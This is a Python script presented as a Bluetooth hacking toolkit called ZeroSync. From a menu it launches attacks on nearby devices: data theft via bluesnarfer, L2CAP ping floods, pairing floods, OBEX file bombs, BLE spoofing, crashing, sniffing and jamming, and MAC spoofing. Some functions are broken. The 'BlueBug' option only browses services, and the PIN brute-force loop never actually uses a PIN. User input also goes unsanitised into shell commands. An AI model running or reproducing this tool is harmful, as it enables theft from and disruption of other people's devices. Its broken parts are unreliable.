#!/usr/bin/env python3
# ZeroSync v3.4 - Final Build with Full Tools + Cyberpunk UI
# Author: Niko DeRuise
# For educational use only

import os
import re
import subprocess
import sys
import time
import shutil
from datetime import datetime
from rich import print
from rich.console import Console, Group
from rich.table import Table
from rich.prompt import Prompt
from rich.panel import Panel
from rich.spinner import Spinner
from rich.layout import Layout
from rich.align import Align
from rich.live import Live

console = Console()
log_dir = "zerosync_logs"
os.makedirs(log_dir, exist_ok=True)

device_list = []

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True).strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()

def log_output(name, content):
    with open(os.path.join(log_dir, f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"), 'w') as f:
        f.write(content)

def get_adapter():
    out = run_cmd("hciconfig")
    matches = re.findall(r'(hci\d+):\s+Type', out)
    return matches[0] if matches else None

def enable_adapter(hci):
    run_cmd("rfkill unblock bluetooth")
    run_cmd(f"hciconfig {hci} up")

def display_title():
    title = Align.center(
        Panel(
            "[bold cyan]ZeroSync v3.4[/bold cyan]\n[magenta]Cyberpunk Bluetooth Hacking Toolkit[/magenta]",
            border_style="cyan", padding=(1, 4)
        ),
        vertical="middle"
    )
    console.clear()
    console.print(title)

def scan_devices():
    global device_list
    device_list = []
    with Live(Spinner("dots", text="Scanning Classic devices..."), refresh_per_second=10):
        output = run_cmd("hcitool scan")
        time.sleep(1)
    for line in output.splitlines()[1:]:
        parts = line.strip().split("\t")
        if len(parts) >= 2:
            mac, name = parts[0], parts[1]
            device_list.append((mac, name, "Classic"))
    with Live(Spinner("dots", text="Scanning BLE devices..."), refresh_per_second=10):
        ble_output = run_cmd("bluetoothctl devices")
        time.sleep(1)
    for line in ble_output.splitlines():
        if line.startswith("Device"):
            _, mac, *name_parts = line.split()
            name = " ".join(name_parts)
            device_list.append((mac, name, "BLE"))
    console.print(Panel(f"[bold green]Scan complete.[/bold green] [cyan]{len(device_list)} devices cached.[/cyan]", border_style="green"))
    log_output("full_scan", output + "\n" + ble_output)

def select_device(filter_type=None):
    filtered = [d for d in device_list if filter_type is None or d[2] == filter_type]
    if not filtered:
        console.print(Panel("[red]No devices cached.[/red] Use [bold cyan]Scan Devices[/bold cyan] first.", border_style="red"))
        return Prompt.ask("Enter MAC manually")
    table = Table(title="Cached Devices", header_style="bold yellow")
    table.add_column("Index", style="cyan")
    table.add_column("MAC", style="white")
    table.add_column("Name", style="green")
    table.add_column("Type", style="magenta")
    for i, (mac, name, dtype) in enumerate(filtered):
        table.add_row(str(i), mac, name, dtype)
    console.print(table)
    idx = Prompt.ask("Select device index (or press Enter for manual)", default="")
    if idx.strip() == "":
        return Prompt.ask("Enter MAC manually")
    try:
        return filtered[int(idx)][0]
    except:
        return Prompt.ask("Invalid input. Enter MAC manually")

# === Classic Attacks ===
def bluesnarf():
    target = select_device("Classic")
    out = run_cmd(f"bluesnarfer -b {target} -r 1-100")
    print(out)
    log_output("bluesnarf", out)

def bluebug():
    target = select_device("Classic")
    out = run_cmd(f"sdptool browse {target}")
    print(out)
    log_output("bluebug", out)

def bt_dos():
    target = select_device("Classic")
    out = run_cmd(f"l2ping -i 0 -s 600 -f {target}")
    print(out)
    log_output("bt_dos", out)

def blueflood():
    target = select_device("Classic")
    for _ in range(20):
        run_cmd(f"hcitool cc {target}")
        run_cmd(f"hcitool auth {target}")
    console.print(f"[cyan]Flood sent to {target}[/cyan]")
    log_output("blueflood", target)

def obex_file_bomb():
    target = select_device("Classic")
    file_path = Prompt.ask("File to send")
    out = run_cmd(f"obexftp --nopath --noconn --uuid none --bluetooth {target} --channel 9 -p {file_path}")
    print(out)
    log_output("obex_bomb", out)

# === BLE Attacks ===
def ble_adv_spoof():
    name = Prompt.ask("Fake BLE name")
    out = run_cmd(f"bleah -A -n '{name}'")
    print(out)
    log_output("ble_adv_spoof", out)

def ble_crasher():
    target = select_device("BLE")
    out = run_cmd(f"bleah -b {target} -c crash")
    print(out)
    log_output("ble_crasher", out)

def ble_sniff():
    out = run_cmd("btlejack -s")
    print(out)
    log_output("ble_sniff", out)

def ble_jam():
    out = run_cmd("btlejack -j")
    print(out)
    log_output("ble_jam", out)

# === Exploits ===
def blueborne_scan():
    out = run_cmd("python3 blueborne-checker.py")
    print(out)
    log_output("blueborne", out)

def legacy_pin_bruteforce():
    target = select_device("Classic")
    wordlist = Prompt.ask("Wordlist path")
    try:
        with open(wordlist, 'r') as f:
            for pin in f.read().splitlines():
                out = run_cmd(f"l2ping -c 1 {target}")
                console.print(f"[yellow]Trying PIN {pin}[/yellow] => {out}")
    except Exception as e:
        print(f"[red]Error: {e}[/red]")

# === Utilities ===
def mac_spoof():
    iface = get_adapter()
    new_mac = Prompt.ask("New MAC")
    run_cmd(f"hciconfig {iface} down")
    out = run_cmd(f"bdaddr -i {iface} {new_mac}")
    run_cmd(f"hciconfig {iface} up")
    print(out)
    log_output("mac_spoof", out)

def monitor_connections():
    out = run_cmd("hcitool con")
    print(out)
    log_output("connections", out)

def vendor_lookup():
    mac = Prompt.ask("MAC Address")
    oui = mac.upper().replace(":", "")[:6]
    out = run_cmd(f"grep {oui} /usr/share/ieee-data/oui.txt")
    print(out if out else "[yellow]Vendor not found.[/yellow]")

def tool_checker():
    tools = ["hcitool", "l2ping", "bdaddr", "bleah", "btlejack", "bluesnarfer", "obexftp", "bluetoothctl"]
    table = Table(title="Tool Checker")
    table.add_column("Tool")
    table.add_column("Status")
    for tool in tools:
        status = "✅" if shutil.which(tool) else "❌"
        table.add_row(tool, status)
    console.print(table)

def reset_bt():
    iface = get_adapter()
    run_cmd(f"hciconfig {iface} down")
    time.sleep(1)
    run_cmd(f"hciconfig {iface} up")
    print("[green]Bluetooth reset.[/green]")

# === Category Menu Framework ===
def category_menu(title, color, options):
    while True:
        console.clear()
        console.print(Panel(f"[{color} bold]{title}[/]", border_style=color))
        for k, (desc, _) in options.items():
            console.print(f"[{color}]{k}.[/] {desc}")
        console.print("[0] Back")
        choice = Prompt.ask("Choose option")
        if choice == "0":
            break
        elif choice in options:
            options[choice][1]()
        else:
            console.print("[red]Invalid choice.[/red]")
            time.sleep(1)

# === Main Menu ===
def main_menu():
    iface = get_adapter()
    if not iface:
        console.print("[red]No Bluetooth adapter found.[/red]")
        return
    enable_adapter(iface)

    while True:
        display_title()
        main_panel = Panel(Group(
            "[cyan]1.[/] 🔍 [bold]Scan Devices[/bold]",
            "[green]2.[/] 🧪 Classic Attacks",
            "[blue]3.[/] 🛰️  BLE Attacks",
            "[red]4.[/] 💣 Exploits",
            "[magenta]5.[/] 🛠 Utilities",
            "[red]0.[/] Exit"
        ), title="[bold]Main Menu[/bold]", border_style="bright_magenta")
        console.print(main_panel)

        choice = Prompt.ask("Select an option")
        if choice == "1":
            scan_devices()
        elif choice == "2":
            category_menu("Classic Attacks", "green", {
                "1": ("BlueSnarf", bluesnarf),
                "2": ("BlueBug", bluebug),
                "3": ("L2CAP DoS", bt_dos),
                "4": ("Pairing Flood", blueflood),
                "5": ("OBEX File Bomb", obex_file_bomb),
            })
        elif choice == "3":
            category_menu("BLE Attacks", "blue", {
                "1": ("Adv Spoof", ble_adv_spoof),
                "2": ("Crasher", ble_crasher),
                "3": ("Sniff", ble_sniff),
                "4": ("Jam", ble_jam)
            })
        elif choice == "4":
            category_menu("Exploits", "red", {
                "1": ("BlueBorne Scanner", blueborne_scan),
                "2": ("Legacy PIN Brute", legacy_pin_bruteforce),
            })
        elif choice == "5":
            category_menu("Utilities", "magenta", {
                "1": ("MAC Spoof", mac_spoof),
                "2": ("Monitor Connections", monitor_connections),
                "3": ("Vendor Lookup", vendor_lookup),
                "4": ("Tool Checker", tool_checker),
                "5": ("Reset Adapter", reset_bt)
            })
        elif choice == "0":
            console.print(Panel("[cyan]ZeroSync terminated. Stay stealthy.[/cyan]", border_style="cyan"))
            break
        else:
            console.print("[red]Invalid choice.[/red]")
            time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print("[red]Run this script with sudo.[/red]")
        sys.exit(1)
    main_menu()
